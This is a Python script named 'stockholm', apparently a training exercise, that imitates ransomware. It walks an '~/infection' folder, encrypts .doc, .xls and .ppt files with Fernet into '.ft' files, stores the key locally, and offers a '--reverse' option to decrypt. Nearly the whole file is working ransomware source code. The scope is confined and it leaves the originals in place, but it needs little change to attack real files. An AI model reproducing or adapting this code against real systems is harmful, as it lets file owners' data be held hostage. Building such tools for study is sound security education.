import os
import sys
import argparse
from cryptography.fernet import Fernet

import base64

# Constants
KEY_FILE = os.path.expanduser('~/infection/stockholm.key')
INFECTION_FOLDER = os.path.expanduser('~/infection')
ENCRYPTED_EXTENSION = '.ft'
AFFECTED_EXTENSIONS = ['.doc', '.xls', '.ppt']

def generate_key():
    key = Fernet.generate_key()
    with open(KEY_FILE, 'wb') as key_file:
        key_file.write(key)

def load_key():
    if not os.path.exists(KEY_FILE):
        print(f'Error: Key file "{KEY_FILE}" does not exist.')
        sys.exit(1)
    with open(KEY_FILE, 'rb') as key_file:
        return key_file.read()

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    encrypted_data = Fernet(key).encrypt(data)
    with open(file_path + ENCRYPTED_EXTENSION, 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as encrypted_file:
        encrypted_data = encrypted_file.read()
    decrypted_data = Fernet(key).decrypt(encrypted_data)
    with open(file_path[:-len(ENCRYPTED_EXTENSION)], 'wb') as decrypted_file:
        decrypted_file.write(decrypted_data)

def encrypt_files(key, silent=False):
    for root, dirs, files in os.walk(INFECTION_FOLDER):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith(tuple(AFFECTED_EXTENSIONS)) and not file_path.endswith(ENCRYPTED_EXTENSION):
                if not silent:
                    print(f'Encrypting: {file_path}')
                encrypt_file(file_path, key)

def decrypt_files(key, silent=False):
    for root, dirs, files in os.walk(INFECTION_FOLDER):
        for file in files:
            file_path = os.path.join(root, file)
            if file_path.endswith(ENCRYPTED_EXTENSION):
                if not silent:
                    print(f'Decrypting: {file_path}')
                decrypt_file(file_path, key)

def print_version():
    print('stockholm v1.0')

def print_help():
    print('Usage: stockholm [options]')
    print('Options:')
    print('  -h, --help     Display this help message')
    print('  -v, --version  Display the version of the program')
    print('  -r, --reverse  Reverse the infection using the encryption key')
    print('  -s, --silent   Do not produce any output during encryption/decryption')

def main():
    parser = argparse.ArgumentParser(prog='stockholm')
    parser.add_argument('-v', '--version', action='store_true', help='Display the version of the program')
    parser.add_argument('-r', '--reverse', metavar='KEY', help='Reverse the infection using the encryption key')
    parser.add_argument('-s', '--silent', action='store_true', help='Do not produce any output during encryption/decryption')

    args = parser.parse_args()

    if args.version:
        print_version()
        sys.exit(0)

    if args.reverse:
        key = args.reverse.encode()
        decrypt_files(key, args.silent)
    else:
        if not os.path.exists(INFECTION_FOLDER):
            print(f'Error: Infection folder "{INFECTION_FOLDER}" does not exist.')
            sys.exit(1)

        if not os.path.exists(KEY_FILE):
            generate_key()

        key = load_key()
        encrypt_files(key, args.silent)

if __name__ == '__main__':
    main()
